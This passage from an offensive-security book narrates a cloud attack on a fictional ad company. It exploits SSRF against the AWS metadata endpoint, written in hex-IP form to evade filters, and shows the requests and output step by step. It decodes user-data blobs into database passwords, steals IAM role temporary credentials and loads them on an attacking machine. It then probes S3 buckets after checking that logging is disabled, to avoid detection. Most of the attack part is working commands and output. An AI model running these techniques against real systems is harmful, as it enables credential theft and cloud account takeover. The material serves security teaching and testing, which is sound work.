<p>The image ID <code>ami-02df9ea15c1778c9c</code> <span class="CodeAnnotation" aria-label="annotation2">2</span> refers to the snapshot used to run the machine, such as an Ubuntu or CoreOS image. Machine images can be public (available to all AWS customers) or private (available only to <span epub:type="pagebreak" title="74" id="Page_74"/>specific accounts). This particular AMI ID is private, as it cannot be found on the AWS EC2 console. Had the AMI ID not been private, we could have spawned a similar instance of the snapshot to test future payloads or scripts.</p>
<p>Finally, the public hostname gives us a direct route to the machine running the demo application (or <em>EC2 instance</em> in AWS jargon), provided local firewall rules allow us to reach it. This machine’s public IP can be deduced from its canonical hostname: <code>3.248.221.147</code> <span class="CodeAnnotation" aria-label="annotation3">3</span>.</p>
<p>Speaking of network configuration, let’s pull the firewall configuration from the metadata API, as shown in <a href="#listing5-2" id="listinganchor5-2">Listing 5-2</a>. Understanding what firewall rules exist can give you hints about other hosts that interact with this system and what services may be running on it, even if they aren’t publicly accessible. Firewall rules are managed in objects called <em>security groups</em>.</p>
<pre><code># MAC address of the network interface
http://0xa9fea9fe/latest/meta-data/network/interfaces/macs/
06:a0:8f:8d:1c:2a

# AWS Owner ID
http://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/owner-id
886371554408

# Security groups
http://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/security-groups
elb_http_prod_eu-west-1
elb_https_prod_eu-west-1
common_ssh_private_eu-west-1
egress_internet_http_any

# Subnet ID where the instance lives
http://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/subnet-id
subnet-00580e48

# Subnet IP range
http://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/subnet-ipv4-cidr-block
172.31.16.0/20</code></pre>
<p class="CodeListingCaption"><a id="listing5-2">Listing 5-2</a>: Firewall configuration of the web app</p>
<p>We need the network’s MAC address to retrieve network information from the metadata API. The AWS account owner is used to build <em>Amazon Resource Names</em> <em>(ARNs</em><em>)</em>, which are unique identifiers for users, policies, and pretty much every resource on AWS; this is essential information that will prove useful in future API calls. The ARN is unique per account, so MXR Ads’ account ID is and will remain 886371554408 for everything—even though a company may and often will have multiple AWS accounts, as we will later see.</p>
<p>We can only list the security groups’ names and not the actual firewall rules, but that already carries enough information to guess the actual firewall rules. The <code>elb</code> section in the <code>elb_http_prod_eu-west-1</code> set, for example, indicates that this set most likely grants the load balancer access to the server. The third security group is interesting: <code>common_ssh_private-eu-west-1</code>. Based on its name, it’s safe to assume that only a select few machines, <span epub:type="pagebreak" title="75" id="Page_75"/>usually called <em>bastions</em>, have the ability to connect through SSH to the rest of the infrastructure. If we can somehow land on one of these precious instances, that would open up many, many doors! It’s funny how we are still stuck outside the organization yet can already get a sense of its infrastructure design ideas.</p>
<h3 id="h2-501263c05-0006">The Dirty Secret of the Metadata API</h3>
<p class="BodyFirst">We are far from done, of course, so let’s kick it up a notch. As we saw in Chapter 3, AWS offers the possibility to execute a script when the machine boots for the first time. This script is usually referred to as <em>user-data</em>. We used it to set up our own infrastructure and bootstrap Docker containers. Great news—that same <em>user-data</em> is available via the metadata API in a single query. By sending one more request through Burp to the MXR Ads demo app, we can see they sure as hell used it to set up their own machines, as shown in <a href="#listing5-3" id="listinganchor5-3">Listing 5-3</a>.</p>
<pre><code># User data information
http://0xa9fea9fe/latest/user-data/

# cloud-config
<span class="CodeAnnotation" aria-label="annotation1">1</span> coreos:
  units:
  - command: start
    content: |-
      [Unit]
      Description=Discover IPs for external services
      Requires=ecr-setup.service
<var>--snip--</var></code></pre>
<p class="CodeListingCaption"><a id="listing5-3">Listing 5-3</a>: Snippet of the <em>user-data</em> script executed on the machine’s first boot</p>
<p>We get a torrent of data streams on the screen, filling our hearts with warm and fuzzy feelings. SSRF in all its glory. Let’s inspect what we got with this last command.</p>
<p>In addition to accepting plain bash scripts, <em>cloud-init</em> supports the file format <em>cloud-config</em>, which uses a declarative syntax to prepare and schedule boot operations. <em>Cloud-config</em> is supported by many distributions, including CoreOS, which appears to be the OS powering this machine <span class="CodeAnnotation" aria-label="annotation1">1</span>.</p>
<p><em>Cloud-config</em> uses a YAML syntax, which uses whitespace and newlines to delimit lists, values, and so on. The <em>cloud-config</em> file describes instructions to set up services, create accounts, execute commands, write files, and perform other tasks involved in boot operations. Some find it cleaner and easier to understand than a crude bash script.</p>
<p>Let’s break down the most important bits of the <em>user-data</em> script we retrieved (see <a href="#listing5-4" id="listinganchor5-4">Listing 5-4</a>).</p>
<pre><code>--<var>snip</var>--
- command: start
  content: |
  <span class="CodeAnnotation" aria-label="annotation1">1</span> [Service]   # Set up a service
    EnvironmentFile=/etc/ecr_env.file # Env variables

<span epub:type="pagebreak" title="76" id="Page_76"/>  <span class="CodeAnnotation" aria-label="annotation2">2</span> ExecStartPre=<b>/usr/bin/docker pull</b> ${URL}/<b>demo-client</b>:master

    <span class="CodeAnnotation" aria-label="annotation3">3</span> ExecStart=<b>/usr/bin/docker</b> run \
        -v /conf_files/logger.xml:/opt/workspace/log.xml \
        --net=host \
<b>        --env-file=/etc/env.file</b> \
        --env-file=/etc/java_opts_env.file \
      <span class="CodeAnnotation" aria-label="annotation4">4</span> --env-file=/etc/secrets.env \
        --name demo-client \
        ${URL}/demo-client:master \
--<var>snip</var>--</code></pre>
<p class="CodeListingCaption"><a id="listing5-4">Listing 5-4</a>: Continuation of the <em>user-data</em> script</p>
<p>First, the file sets up a service to be executed at the machine’s boot time <span class="CodeAnnotation" aria-label="annotation1">1</span>. This service pulls the <code>demo-client</code> application image <span class="CodeAnnotation" aria-label="annotation2">2</span> and proceeds to run the container using a well-furnished <code>docker</code> <code>run</code> command <span class="CodeAnnotation" aria-label="annotation3">3</span>.</p>
<p>Notice the multiple <code>--env-file</code> switches <span class="CodeAnnotation" aria-label="annotation4">4</span> that ask Docker to load environment variables from custom text files, one of which is so conveniently named <em>secrets.env</em>! The million-dollar question, of course, is where are these files located?</p>
<p>There is a small chance they are baked directly into the AMI image, but then making updates to configuration files would be the Everest of inconvenience for MXR Ads. To update a database password, the company would need to bake and release a new CoreOS image. Not very efficient. No, chances are the secrets file is either dynamically fetched via S3 or embedded directly in the same <em>user-data</em> script. Indeed, if we scroll a bit further we come across the following snippet:</p>
<pre><code><var>--snip--</var>
write_files:
- content: H4sIAEjwoV0AA13OzU6DQBSG4T13YXoDQ5FaTFgcZqYyBQbmrwiJmcT+Y4Ed6/...
  encoding: gzip+base64
  path: /etc/secrets.env
  permissions: "750"
<var>--snip--</var></code></pre>
<p>Brilliant. The content of this blob is base64-encoded, so we’ll decode it, decompress it, and marvel at its content, as shown in <a href="#listing5-5" id="listinganchor5-5">Listing 5-5</a>.</p>
<pre><code>root@Point1:~/# <b>echo H4sIAAA...|base64 -d |gunzip</b>

ANALYTICS_URL_CHECKSUM_SEED = 180309210013
CASSANDRA_ADS_USERSYNC_PASS = QZ6bhOWiCprQPetIhtSv
CASSANDRA_ADS_TRACKING_PASS = 68niNNTIPAe5sDJZ4gPd
CASSANDRA_ADS_PASS = fY5KZ5ByQEk0JNq1cMM3
CASSANDRA_ADS_DELIVERYCONTROL_PASS = gQMUUHsVuuUyo003jqFU
IAS_AUTH_PASS = PjO7wnHF9RBHD2ftWXjm
ADS_DB_PASSWORD = !uqQ#:9#3Rd_cM]</code></pre>
<p class="CodeListingCaption"><a id="listing5-5">Listing 5-5</a>: A snippet of the decoded <em>secrets.env</em> file containing passwords</p>
<p><span epub:type="pagebreak" title="77" id="Page_77"/>Jackpot! The blob has yielded many passwords to access Cassandra clusters (Cassandra is a highly resilient NoSQL database usually deployed to handle large-scale data with minimal latency). We also get two obscure passwords holding untold promise. Of course, passwords alone are not enough. We need the associated host machines and usernames, but so does the application, so we can assume the second environment file from <a href="#listing5-4">Listing 5-4</a>, <em>env.file</em>, should contain all the missing pieces.</p>
<p>Scrolling further down <em>user-data</em>, however, we find no definition of <em>env.file</em>. But we do come across a shell script, <em>get-region-params.sh</em>, that seems to reset our precious <em>env.file</em> (see <a href="#listing5-6" id="listinganchor5-6">Listing 5-6</a>).</p>
<pre><code>--<var>snip</var>--
 - command: start
   content: |-
       [Unit]
       Description=Discover IPs for external services
       [Service]
       Type=oneshot
       ExecStartPre=/usr/bin/rm -f /etc/env.file
<b>       ExecStart=/conf_files/get-region-params.sh</b>
       name: define-region-params.service
<var>--snip--</var></code></pre>
<p class="CodeListingCaption"><a id="listing5-6">Listing 5-6</a>: A discovery service that seems to interact with <em>env.file</em></p>
<p>It seems likely this script will create <em>env.file</em>. Let’s dive into the content of <em>get-region-params.sh</em>, created three lines below (see <a href="#listing5-7" id="listinganchor5-7">Listing 5-7</a>).</p>
<pre><code><var>--snip--</var>
write_files:
<span class="CodeAnnotation" aria-label="annotation1">1</span> - content: H4sIAAAAAAAC/7yabW/aShbH3/tTTFmu0mjXOIm6lXoj98qAQ6wSG9lOpeyDrME+...
  encoding: gzip+base64
  path: /conf_files/define-region-params.sh</code></pre>
<p class="CodeListingCaption"><a id="listing5-7">Listing 5-7</a>: The lines in charge of creating <em>get-region-params.sh</em> in the <em>user</em><em>-</em><em>data</em> script</p>
<p>We have another encoded blob <span class="CodeAnnotation" aria-label="annotation1">1</span>. Using some <code>base64</code> and <code>gunzip</code> magic, we translate this pile of garbage to a normal bash script that defines various endpoints, usernames, and other parameters, depending on the region where the machine is running (see <a href="#listing5-8" id="listinganchor5-8">Listing 5-8</a>). I will skip over the many conditional branches and case switch statements to only print the relevant parts.</p>
<pre><code>root@Point1:~/# <b>echo H4sIAAA...|base64 -d |gunzip</b>

AZ=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone)
REGION=${AZ%?}

case $REGION in
  ap-southeast-1...
    ;;
  eu-west-1
    echo "S3BUCKET=mxrads-dl" &gt;&gt; /etc/env.file <span class="CodeAnnotation" aria-label="annotation1">1</span>
<span epub:type="pagebreak" title="78" id="Page_78"/>    echo "S3MISC=mxrads-misc" &gt;&gt; /etc/env.file <span class="CodeAnnotation" aria-label="annotation2">2</span>
    echo "REDIS_GEO_HOST=redis-geolocation.production.euw1.mxrads.tech" &gt;&gt; /etc/env.file
    echo "CASSA_DC=eu-west-delivery" &gt;&gt; /etc/env.file
    echo "CASSA_USER_SYNC=usersync-euw1" &gt;&gt; /etc/env.file
    echo "CASSA_USER_DLVRY=userdc-euw1" &gt;&gt; /etc/env.file

<var>--snip--</var>
cassandra_delivery_host="cassandra-delivery.prod.${SHORT_REGION}.mxrads.tech"
<var>--snip--</var></code></pre>
<p class="CodeListingCaption"><a id="listing5-8">Listing 5-8</a>: A snippet of the decoded <em>get-region-params.sh</em> script</p>
<p>Notice the S3 buckets mxrads-dl <span class="CodeAnnotation" aria-label="annotation1">1</span> and mxrads-misc <span class="CodeAnnotation" aria-label="annotation2">2</span> we came across earlier during reconnaissance.</p>
<p>Looking at the script, we can see that the instance is using the metadata API to retrieve its own region and build endpoints and usernames based on that information. That’s the first step a company will take toward infrastructure resilience: it packages an app, nay, an environment, that can run on any hypervisor, in any datacenter, in any country. Powerful stuff, for sure, with the caveat, as we are witnessing firsthand, that a simple SSRF vulnerability could expose all of the application’s secrets to anyone willing to poke at it.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	AWS released the metadata API v2 in December 2019, which requires a first PUT request to retrieve a session token. One can only query the metadata API v2 by presenting a valid token. This restriction effectively thwarts attacks like SSRF. Seems like a good plan, you might think, but then AWS went ahead and shot the sheriff with the following statement: “The existing instance metadata service (IMDSv1) is fully secure, and AWS will continue to support it.” Ah, of course companies will invest in rewriting their entire deployment process to replace something that is already secure. It seems SSRF still has a bright future ahead of it.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>Cross-referencing this file with passwords we got from <a href="#listing5-5">Listing 5-5</a> and making educated guesses based on the variable names, we can reconstruct the following credentials:</p>
<p class="ListHead"><b>cassandra-delivery.prod.euw1.mxrads.tech</b></p>
<ol class="none">
<li>Username: userdc-euw1</li>
<li>Password: gQMUUHsVuuUyo003jqFU</li>
</ol>
<p class="ListHead"><b>cassandra-usersync.prod.euw1.mxrads.tech</b></p>
<ol class="none">
<li>Username: usersync-euw1</li>
<li>Password: QZ6bhOWiCprQPetIhtSv</li>
</ol>
<p>Some machines are missing usernames, and other passwords are missing their matching hostnames, but we will figure it all out in time. For now, this is everything we can fully put together.</p>
<p><span epub:type="pagebreak" title="79" id="Page_79"/>With this information, the only thing preventing us from accessing these databases is basic, boring firewall rules. These endpoints resolve to internal IPs, unreachable from the dark corner of the internet where our attack server lies, so unless we figure out a way to change these firewall rules or bypass them altogether, we are stuck with a pile of worthless credentials.</p>
<p>Well, that’s not entirely true. There is one set of credentials that we haven’t yet retrieved, and unlike the previous ones, it is not usually subject to IP restrictions: the machine’s IAM role.</p>
<p>On most cloud providers, you can assign a <em>role</em> to a machine, which is a set of default credentials. This gives the machine the ability to seamlessly authenticate to the cloud provider and inherit whatever permissions are assigned to that role. Any application or script running on the machine can claim that role, and this avoids the nasty habit of hardcoding secrets in the code. Seems perfect . . . again, on paper.</p>
<p>In reality, when an EC2 machine (or, more accurately, an instance profile) impersonates an IAM role, it retrieves a set of temporary credentials that embody that role’s privileges. These credentials are made available to the machine through—you guessed it—the metadata API.</p>
<p>We call the <em>/latest/meta-data/iam/security-credentials </em>endpoint to retrieve the role’s name:</p>
<pre><code>http://0xa9fea9fe/latest/meta-data/iam/security-credentials
demo-role.ec2</code></pre>
<p>We can see that the machine was assigned the demo-role.ec2 role. Let’s pull its temporary credentials, again by calling the metadata API:</p>
<pre><code># Credentials
http://0xa9fea9fe/latest/meta-data/iam/security-credentials/demo-role.ec2

{
 Code : Success,
 LastUpdated : 2020-10-26T11:33:39Z,
 Type : AWS-HMAC,
 <b>AccessKeyId : ASIA44ZRK6WS4HX6YCC7,</b>
 SecretAccessKey : nMylmmbmhHcOnXw2eZ3oh6nh/w2StPw8dI5Mah2b,
 Token : AgoJb3JpZ2luX2VjEFQ...
 Expiration : 2020-10-26T17:53:41Z <span class="CodeAnnotation" aria-label="annotation1">1</span>
}</code></pre>
<p>We get the <code>AccessKeyId</code> and <code>SecretAccessKey</code>, which together form the classic AWS API credentials, as well as an access token that validates this set of temporary credentials.</p>
<p>In theory, we can load these keys into any AWS client and interact with MXR Ads’ account from any IP in the world using the machine’s identity: demo-role.ec2. If this role allows the machine access to S3 buckets, we have access to those buckets. If the machine can terminate instances, now so can we. We can take over this instance’s identity and privileges for the next six hours before the credentials are reset <span class="CodeAnnotation" aria-label="annotation1">1</span>.</p>
<p><span epub:type="pagebreak" title="80" id="Page_80"/>When this grace period expires, we can once again retrieve a new set of valid credentials. Now you understand why SSRF is my new best friend. Here we register the AWS credentials in our home directory under the profile name <code>demo</code>:</p>
<pre><code># On our attacking machine
root@Point1:~/# <b>vi ~/.aws/credentials</b>
[demo]
aws_access_key_id = ASIA44ZRK6WSX2BRFIXC
aws_secret_access_key = +ACjXR87naNXyKKJWmW/5r/+B/+J5PrsmBZ
aws_session_token = AgoJb3JpZ2l...</code></pre>
<p>Seems like we are on a roll! Unfortunately, just as we start to tighten our grip around the target, AWS comes at us with yet another blow: IAM.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	We can use these specific AWS credentials by appending the switch <code>--profile demo</code> to our regular AWS CLI commands, or by setting the global variable <code>AWS_PROFILE=demo</code>.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<h3 id="h2-501263c05-0007">AWS IAM</h3>
<p class="BodyFirst">AWS IAM is the authentication and authorization service, and it can be something of a quagmire. By default, users and roles have almost zero privileges. They cannot see their own information, like their usernames or access key IDs, because even these trivial API calls require explicit permission.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	Compare AWS IAM to an Active Directory (AD) environment, where users can, by default, not only get every account’s information and group membership but also hashed passwords belonging to service accounts. Check out the AD Kerberoasting technique: <a href="http://bit.ly/2tQDQJm" class="LinkURL">http://bit.ly/2tQDQJm</a><em>.</em></p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>Obviously, regular IAM users like developers have some basic rights of self-inspection so they can do things like list their group membership, but that’s hardly the case for an instance profile attached to a machine. When we try to get basic information about the role demo-role-ec2, we get an astounding error:</p>
<pre><code># On our attacking machine
root@Point1:~/# </code></pre><code class="bold">aws iam get-role \</code>
<pre><code><b>--role-name demo-role-ec2 \</b>
<b>--profile demo</b>

An error occurred (AccessDenied) when calling the GetRole operation: User:
arn:aws:sts::886371554408:assumed-role/demo-role.ec2/i-088c8e93dd5703ccc
is not authorized to perform: iam:GetRole on resource: role demo-role-ec2</code></pre>
<p>An application does not usually evaluate its set of permissions at runtime; it just performs the API calls as dictated by the code and acts accordingly. This means we have valid AWS credentials, but at the moment we have absolutely no idea how to use them.</p>
<p>We’ll have to do some research. Almost every AWS service has some API call that describes or lists all its resources (<code>describe-instances</code> for EC2, <code/><span epub:type="pagebreak" title="81" id="Page_81"/>list-buckets for S3, and so on). So, we can slowly start probing the most common services to see what we can do with these credentials and work our way up to testing all of AWS’s myriad services.</p>
<p>One option is to go nuts and try every possible AWS API call (there are thousands) until we hit an authorized query, but the avalanche of errors we’d trigger in the process would knock any security team out of their hibernal sleep. By default, most AWS API calls are logged, so it’s quite easy for a company to set up alerts tracking the number of unauthorized calls. And why wouldn’t they? It literally takes a few clicks to set up these alerts via the monitoring service CloudWatch.</p>
<p>Plus, AWS provides a service called GuardDuty that automatically monitors and reports all sorts of unusual behaviors, such as spamming 5,000 API calls, so caution is paramount. This is not your average bank with 20 security appliances and a $200K/year outsourced SOC team that still struggles to aggregate and parse Windows events. We need to be clever and reason about it purely from context.</p>
<p>For instance, remember that mxrads-dl S3 bucket that made it to this instance’s <em>user-data</em>? We could not access that before without credentials, but maybe the demo-role.ec2 role has some S3 privileges that could grant us access? We find out by calling on the AWS API to list MXR Ads’ S3 buckets:</p>
<pre><code># On our attacking machine
root@Point1:~/# <b>aws s3api listbuckets --profile demo</b>
An error occurred (AccessDenied) when calling the ListBuckets operation:
Access Denied</code></pre>
<p>Okay, trying to list all S3 buckets in the account was a little too bold, but it was worth a shot. Let’s take it back and take baby steps now. Again using the demo-role.ec2 role, we try just listing keys inside the mxrads-dl bucket. Remember, we were denied access earlier without credentials:</p>
<pre><code>root@Point1:~/# <b>aws s3api list-objects-v2 --profile demo --bucket mxrads-dl &gt;</b>
<b>list_objects_dl.txt</b>
root@Point1:~/# <b>grep '"Key"' list_objects_dl | sed 's/[",]//g' &gt;</b>
<b>list_keys_dl.txt</b>

root@Point1:~/# <b>head list_keys_dl.txt</b>
  Key: jar/maven/artifact/com.squareup.okhttp3/logging-interceptor/4.2.2
  Key: jar/maven/artifact/com.logger.log/logging-colors/3.1.5
<var>--snip--</var></code></pre>
<p>Now we are getting somewhere! We get a list of keys and save them away. As a precaution, before we go berserk and download every file stored in this bucket, we can make sure that logging is indeed disabled on S3 object operations. We call the <code>get-bucket-logging</code> API:</p>
<pre><code>root@Point1:~/# <b>aws s3api get-bucket-logging --profile demo --bucket mxrads-dl</b>

&lt;empty_response&gt;</code></pre>
<p><span epub:type="pagebreak" title="82" id="Page_82"/>And we find it’s empty. No logging. Perfect. You may be wondering why a call to this obscure API succeeded. Why would an instance profile need such a permission? To understand this weird behavior, have a look at the full list of possible S3 operations at <a href="https://docs.aws.amazon.com/" class="LinkURL">https://docs.aws.amazon.com/</a>. Yes, there are hundreds of operations that can be allowed or denied on a bucket.</p>
<p>AWS has done a spectacular job defining very fine-grained permissions for each tiny and sometimes inconsequential task. No wonder most admins simply assign wildcard permissions when setting up buckets. A user needs read-only access to a bucket? A <code>Get*</code> will do the job; little do they realize that a <code>Get*</code> implies 31 permissions on S3 alone! <code>GetBucketPolicy</code> to get the policy, <code>GetBucketCORS</code> to return CORS restrictions, <code>GetBucketACL</code> to get the access control list, and so forth.</p>
<p>Bucket policies are mostly used to grant access to foreign AWS accounts or add another layer of protection against overly permissive IAM policies granted to users. A user with an <code>s3:*</code> permission could therefore be rejected with a bucket policy that only allows some users or requires a specific source IP. Here we attempt to get the bucket policy for mxrads-dl to see if it does grant access to any other AWS accounts:</p>
<pre><code>root@Point1:~/# <b>aws s3api get-bucket-policy --bucket mxrads-dl</b>
{
  "Id": "Policy1572108106689",
  "Version": "2012-10-17",
  "Statement": [
      {
         "Sid": "Stmt1572108105248",
         "Action": [
             "s3:List*", " s3:Get*"
         ],
         "Effect": "Allow",
         "Resource": "arn:aws:s3:::mxrads-dl",
         "Principal": {
           <span class="CodeAnnotation" aria-label="annotation1">1</span> "AWS": "arn:aws:iam::983457354409:root"
         }
   }]
}</code></pre>
<p>This policy references the foreign AWS account 983457354409 <span class="CodeAnnotation" aria-label="annotation1">1</span>. This account could be Gretsch Politico, an internal MXR Ads department with its own AWS account, or a developer’s personal account for that matter. We cannot know for sure, at least not yet. We’ll note it for later examination.</p>
<h3 id="h2-501263c05-0008">Examining the Key List</h3>
<p class="BodyFirst">We go back to downloading the bucket’s entire key list and dive into the heap, hoping to find sensitive data and get an idea of the bucket’s purpose. We have an impressive number of public binaries and <em>.jar</em> files. We find a collection of the major software players with different versions, such as Nginx, Java collections, and Log4j. It seems they replicated some sort of <span epub:type="pagebreak" title="83" id="Page_83"/>public distribution point. We find a couple of bash scripts that automate the <code>docker login</code> command or provide helper functions for AWS commands, but nothing stands out as sensitive.</p>
<p>From this, we deduce that this bucket probably acts as a corporate-wide package distribution center. Systems and applications must use it to download software updates, packages, archives, and other widespread packages. I guess not every public S3 is an El Dorado waiting to be pilfered.</p>
<p>We turn to the <em>user-data</em> script we pulled earlier hoping for additional clues about services to query, but find nothing out of note. We even try a couple of AWS APIs with the demo role credentials to common services like EC2, Lambda, and Redshift out of desperation, only to get that delicious error message back. How frustrating it is to have valid keys yet stay stranded at the front door simply because there are a thousand keyholes to try . . . but that’s just the way it is sometimes.</p>
<p>As with most dead ends, the only way forward is to go backward, at least for a while. It’s not like the data we gathered so far is useless; we have database and AWS credentials that may prove useful in the future, and most of all, we gained some insight into how the company handles its infrastructure. We only need a tiny spark to ignite for the whole ranch to catch fire. We still have close to a hundred domains to check. We will get there.</p>
<h2 id="h1-501263c05-0005">Resources</h2>
<ul>
<li>See this short introduction to Burp if you are not familiar with the tool: <a href="http://bit.ly/2QEQmo9" class="LinkURL">http://bit.ly/2QEQmo9</a><em>.</em></li>
<li>Check out the progressive capture-the-flag exercises at <a href="http://flaws.cloud/" class="LinkURL">http://flaws.cloud/</a> to get you acquainted with basic cloud-hacking reflexes.</li>
<li>CloudBunny and fav-up are tools that can help you bust out the IP addresses of services hiding behind CDNs: <a href="https://github.com/Warflop/CloudBunny/" class="LinkURL">https://github.com/Warflop/CloudBunny/</a><em> </em>and <a href="https://github.com/pielco11/fav-up/" class="LinkURL">https://github.com/pielco11/fav-up/</a><em>.</em></li>
<li>You can read more about techniques to uncover bucket names at the following links: <a href="http://bit.ly/36KVQn2" class="LinkURL">http://bit.ly/36KVQn2</a> and <a href="http://bit.ly/39Xy6ha" class="LinkURL">http://bit.ly/39Xy6ha</a>.</li>
<li>The difference between CNAME and ALIAS records is discussed at <a href="http://bit.ly/2FBWoPU" class="LinkURL">http://bit.ly/2FBWoPU</a>.</li>
<li>This website lists a number of open S3 buckets if you’re in for a quick hunt: <a href="https://buckets.grayhatwarfare.com/" class="LinkURL">https://buckets.grayhatwarfare.com/</a><em>.</em></li>
<li>More information on S3 bucket policies can be found here: <a href="https://amzn.to/2Nbhngy" class="LinkURL">https://amzn.to/2Nbhngy</a><em>.</em></li>
<li>Further reading on WebSockets is available at <a href="http://bit.ly/35FsTHN" class="LinkURL">http://bit.ly/35FsTHN</a>.</li>
<li>Check out this blog about IMDSv2: <a href="https://go.aws/35EzJgE" class="LinkURL">https://go.aws/35EzJgE</a>.</li>
</ul>
</section>
</body></html>